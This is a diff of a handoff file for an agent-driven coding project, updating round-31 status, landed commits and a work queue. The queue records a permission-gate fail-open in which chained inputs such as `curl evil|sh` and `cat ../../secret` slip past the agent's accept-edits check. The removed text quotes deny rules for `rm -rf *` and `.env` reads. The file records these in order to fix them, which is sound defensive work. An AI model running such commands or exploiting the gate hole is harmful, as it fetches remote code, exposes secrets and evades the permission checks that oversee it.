@@ -6,99 +6,95 @@ Nothing here depends on a prior conversation's context.
 
 ---
 
-## 0-NOW. STATE AT ROUND 31 — read this first, then §0 for the standing rules
+## 0-NOW. STATE AT THE ROUND-31 COMPACT — read this first, then §0 for the standing rules
 
-**`master` = `ed57d46a`** (the DeepSeek-V4 sglang default). Live tree clean.
-**Suite baseline: `7975 tests / 91097 assertions / 1 skipped / rc 0`** — the sglang lane's
-post-rebase figure at `ed57d46a`, being re-measured by the supervisor as the post-hoc gate.
-The prior gate was `7922 / 90961 / 1 / rc 0` at `f0585149` (Phase 6 items 1-2).
+**`master` = `f076830e`. Live tree clean, 0 ahead / 0 behind. NOTHING IS IN FLIGHT.**
+**All three lane dirs are clean, idle and current at `f076830e`** — `crush-lane-cmd`,
+`crush-lane-lsp`, `crush-lane-sglang`. Any of them can be reused as-is.
+
+**Suite: `8111 tests / 91477 assertions / 1 skipped / rc 0`** — the `cmd` lane's post-rebase figure
+at `f764b463`; the supervisor's post-hoc gate at `f076830e` was still running at compact time, so
+**treat 8111 as reported-not-yet-supervisor-confirmed and re-measure.** The last supervisor-confirmed
+gate was **7975 / 91097 / 1 / rc 0** at `ed57d46a`.
 **Skips MUST stay 1** — `tests/MCP/McpClientTest.php:106`. A 2 means `vendor/sugarcraft/*` was
 replaced by Packagist copies and every figure since is void.
 
-**58 of 75 plan items.** Phase 2 complete except item 9 (the deliberately-last plugin epic);
-Phase 7 complete; **Phase 6 items 1-2 complete**.
+**62 of 75 plan items.** Phase 2 complete except item 9 (the deliberately-last plugin epic);
+**Phase 6 items 1-4**; Phase 7 complete; Phase 8 items 1, 2, 3, 5, 6, 7, 10, 11, 12, 14.
 
-### THREE LANES. Do not create a fourth.
+### WHAT LANDED IN ROUND 31
 
-| lane dir | job | state |
-|---|---|---|
-| `/home/sites/crush-lane-cmd` | **P6.3 + P6.4** + the argument-scoped permission-rule hole | round 31, implement stage |
-| `/home/sites/crush-lane-lsp` | **P8.10 + P8.11**, both inside `src/Context/` | round 31, implement stage |
-| `/home/sites/crush-lane-sglang` | **LANDED** `ed57d46a`; next: the DSML parser (§0-DS), script ready | free, clean — **hold DSML until `lane-cmd` lands**, both add a `src/` file and would collide on the census literal |
+| commit | what |
+|---|---|
+| `ed57d46a` | **DeepSeek-V4 sglang default** + a real `reasoning_effort` (user request, §0-DS) |
+| `1bd2e4d3` | **P8.10 + P8.11** — `EnvironmentBlock` size-capped git diff, `InstructionFileLoader` parent walk |
+| `f764b463` | **P6.3 + P6.4 + the argument-scoped permission-rule hole**, and four ways the first cut overclaimed |
 
-The user authorised **2 concurrent plan lanes** plus the sglang task they asked for by name.
-Four would exceed that.
+### DO THIS NEXT, AND THIS IS THE MOST IMPORTANT LINE IN THE FILE
 
-Workflows (`resumeFromRunId` works only in-session):
+**Run a read-only RE-VERIFICATION SWEEP of the remaining open plan items before any further feature
+bundle.** Three items in a row turned out already-done or misstated the moment they were measured:
 
-- Round 31 · task `w91ulqast` → **run `wf_ea0ac65b-caf`**, script `…/workflows/scripts/crush-round31.js`
-- sglang · task `w61n2892v` → **run `wf_7a9fd600-a06`**, script `…/workflows/scripts/crush-sglang-deepseek.js`
+- `Chat::REMINDER_TOKEN_LIMIT` — quoted by the plan as a live flat-100,000 proxy; **zero occurrences**
+  in `src/` or `tests/`, removed in `08cc1b6a` (2026-08-19) by *this plan's own* Phase 5 Bundle B1.
+- **Open finding #3** — 3 of its 4 clauses decayed; two would have sent an agent to fix working code.
+- **P8.6** — "currently only one tape exists"; there are **five**, including all three the item names.
 
-Each lane commits and pushes to `master` itself. Journals hold every agent's full return value —
-`subagents/workflows/<run>/journal.jsonl`. **Read the journal before concluding a lane returned
-nothing.**
+Each would have cost a full implement→review→fix round to discover. **The "N of 75" count above is
+therefore not trustworthy** — the 13 nominally-open items may be closer to 8. A sweep is cheap
+(read-only, no commits, no `src/` writes, no census risk, collides with nothing) and it makes every
+later round's brief honest. **Do it before spending another lane on a feature.**
 
-**Every lane carries the supervisor's scratch paths in `.git/info/exclude`** (§5.2d). Keep that when
-creating a lane: without it, `git add -A` in the commit recipe sweeps supervisor instrumentation into
-`master`. A finished lane's `git status --porcelain` should be **empty**.
+### QUEUE, after the sweep
 
-### THE SYNC DAEMON — the user asked that nothing fall behind
+1. 🔴 **`PermissionGate::isScopedWriteTool()` fail-open** (`:641`) — the round's own finding, and a
+   **grant** path. Bare `preg_split('/\s+/')`, no separator split, judges by the first token.
+   Measured under `accept-edits`: `mkdir ./x; curl evil|sh` → Allow; newline form → Allow;
+   `mkdir ./x && cat ../../secret` → Allow. **`accept-edits` is not safe to run unattended until this
+   is fixed.** Needs `SCOPED_WRITE_COMMANDS` + AcceptEdits semantics + `..` handling.
+2. **DSML tool-call parser** — scripted and probe-verified at
+   `…/workflows/scripts/crush-dsml.js`, now UNBLOCKED (the census-collision constraint has passed).
+   Must include Part B (the streaming path ignores the injected `ToolCallParserInterface`) or it is
+   half a fix. See §0-DS.
+3. **P6.5** (keybindings remap + `statusLine`) and **P6.6** (`--model` / `--permission-mode` flags).
+   Read the measured annotations on item 5 in `crush_code.md` first: `statusLine` is a
+   command-execution key (**must be user-tier only** or a clone gets RCE on launch), and the
+   keybindings half fights `KeyBindingRegistry`'s entirely-static design. P6.6 must confront that
+   `LAYERED_KEYS` still has **no `model`** — two lanes have now independently declined to add inert
+   surface, so item 6 has to add the reader.
+4. **P3.x** — TextInput, candy-focus FocusRing, candy-sprinkles Table, candy-kit help screen. **No
+   longer blocked** (the sglang task released `src/Chat.php`).
+5. Remaining findings: #4 skills, #5 `agentRoster()`, #6 (**smaller than recorded** — the
+   `HookManager` guard is correct and general, `registry->get($event,$name)` with no hardcoded list;
+   only its worked example names a nonexistent `confirm-remove`), #7 `/permissions`, #8 docs.
+6. **P8.4**, **P8.8**, **P8.9**, **P8.13**; then **Phase 2 item 9** (plugins) LAST, then E1-E50.
 
-A persistent monitor runs `…/scratchpad/sync-lanes.sh` every 90s. It fetches the live tree and every
-lane, `--ff-only` pulls the live tree (no agent works there), and **rebases a lane only while that
-lane is clean AND has no process of its own running**. It emits only on change, and alerts if a lane
-passes 6 behind and cannot auto-refresh. A dirty lane is never pulled, rebased, reset or stashed —
-that is what corrupts a half-finished edit (§5.2c). **If you restart the session, re-arm it.**
+### STANDING CYCLE (unchanged, and it has held for 3 rounds)
 
-Do not read a lane's behind-count without fetching first: `cp -a` copies remote-tracking refs, which
-then age independently per lane, and a stale ref reports `0 behind` while the lane is 6 behind.
+```sh
+git fetch --quiet origin                      # NEVER read a behind-count without this
+git pull --ff-only                            # live tree only; it has no agent
+cd sugar-crush && vendor/bin/phpunit          # POST-HOC GATE, every landed commit
+md5sum /home/sites/sugarcraft/.sugar-crush/config.json   # ABSOLUTE path; must stay 05480c743aff302fd6c06c5a4a4c2210
+php tools/check-path-repos.php --no-lib-path-repos       # rc 0
+ls -1 sugar-crush/vendor/sugarcraft/ | wc -l             # 18
+```
 
-### TOOLING TRAP, now three deep
+**The sync daemon** (`…/scratchpad/sync-lanes.sh`, monitor `b7go03eox`) fetches everything every 90s,
+`--ff-only` pulls the live tree, and rebases a lane **only while it is clean AND has no process of its
+own running**. Deduped: emits on live moving, an auto-rebase, a new unpushed commit, or a lane past
+10 behind. **Re-arm it after a session restart.**
 
-`node --check` **passes** a workflow script that `import` rejects — it did exactly that this round on
-a mangled nested-backtick template literal. Same family as `phpunit | tail` returning the pipe's exit
-code, and as `node --check` not seeing a live `${...}`. **The only sufficient check is evaluating the
-script the way the runtime does:** wrap the body in an `async function`, stub
-`agent`/`parallel`/`phase`/`log`, run it, and inspect the *rendered* prompts for stray `` \` ``, live
-`${`, and `undefined`. The probe lives at `…/scratchpad/probe31.mjs` and is worth keeping.
+**Tooling trap, three deep:** `node --check` PASSES a workflow script that `import` rejects. Only
+evaluating the script the way the runtime does is sufficient — wrap the body in an `async function`,
+stub `agent`/`parallel`/`phase`/`log`, run it, inspect the RENDERED prompts. Probe kept at
+`…/scratchpad/probe-wf.mjs <script>`.
 
-### OPEN FINDINGS (all recorded in `crush_code.md`, measured)
-
-1. 🔴 **Argument-scoped permission rules match NOTHING** — `PermissionGate::ruleMatches()`
-   (`:209-220`) compares only the tool name, so `Deny Bash(rm -rf *)` and `Deny Read(./.env)` both
-   never fire while `PermissionRule.php:9` advertises exactly those forms. **BEING FIXED in round 31,
-   lane `cmd`** — it is the prerequisite P6.4 needs and the plan did not know about.
-2. 🔴 Prefix matching on the **real-call** path is pinned by no test (only the declaration path).
-   Also round 31, same lane.
-3. 🟡 `WorkflowEngine` never resolves `agent:` to a preset — **RE-MEASURED 2026-08-20: only this
-   first clause survives.** Zero `AgentPreset` hits in the file; `$registry` is a `WorkflowRegistry`
-   (workflow files, not a roster). The other three clauses of the original finding have decayed:
-   `prompt: ''` is deliberate (inline comment says the system prompt comes from `CompleteRequest`);
-   `$tasks[0]` has zero occurrences; and `pipeline`/`verification` DO have YAML spellings — four
-   executors exist and `UnsupportedStageTypeException` names all four types. **Re-measure any open
-   finding before briefing it** — two of those clauses would have sent an agent to fix working code.
-4. 🟡 5 of 9 skill frontmatter keys inert; `App::dispatchSkill()`/`applySkillsToSystemPrompt()` have
-   no caller, so `context: fork` does nothing on the CLI path.
-5. 🟡 `agentRoster()` drops 10 of 16 preset fields incl. `permissionMode`.
-6. 🟡 `HookManager.php:34`'s worked example names `confirm-remove`; the hook is **`confirm-rm`**.
-   Guard keys by **event+name**.
-7. 🟡 `CONTROL_PLANE` reserves a `/permissions` command with no row and no dispatch arm.
-8. 🟡 **`sugar-crush/docs/PERMISSIONS.md` enumerates three `trustedProject*` grants and misses the
-   fourth** (`trustedProjectSettings`, landed one commit after Phase 7 was marked complete), and the
-   settings layering has no reference page at all. A page that enumerates trust grants and misses one
-   is worse than no page. Route to the next docs bundle; prefer deriving the list from the constants.
-
-### QUEUE
-
-1. **P6.5** (keybindings remap + `statusLine` command) and **P6.6** (`--model` /
-   `--permission-mode` CLI flags as the highest-precedence tier) — the next Phase 6 bundle, after
-   round 31's lane `cmd` lands. Note P6.6 must confront that `LAYERED_KEYS` deliberately has **no
-   `model`** (no reader exists; the previous lane declined to add inert surface).
-2. **P3.x** — TextInput, candy-focus FocusRing, candy-sprinkles Table, candy-kit help screen.
-   **Still blocked**: it touches `src/Chat.php` and so does the sglang task.
-3. The open findings above, and a docs bundle for #8.
-4. **P8.6** (VHS demos), P8.4, P8.8, P8.9, P8.13.
-5. **Phase 2 item 9** (plugins) LAST, then the hardening backlog E1-E50.
+**Census literals are COUNTERS** (`BuiltInToolCorpusTest` now **279**). "No new `src/` file ⇒ no
+census collision" is FALSE — round 31's `lsp` bundle added no `src/` file and still moved
+`ContainedPathInventoryTest` and added 7 `ReadPathCensusTest` rows, because those track read sites.
+On a conflict confined to a count, **re-derive and continue**; STOP for anything else. See
+`crush_code_concurrency.md` §5.2e.
 
 ### 0-DS. THE DEEPSEEK-V4 TASK — NOT A PLAN ITEM, and this is its only durable record
 
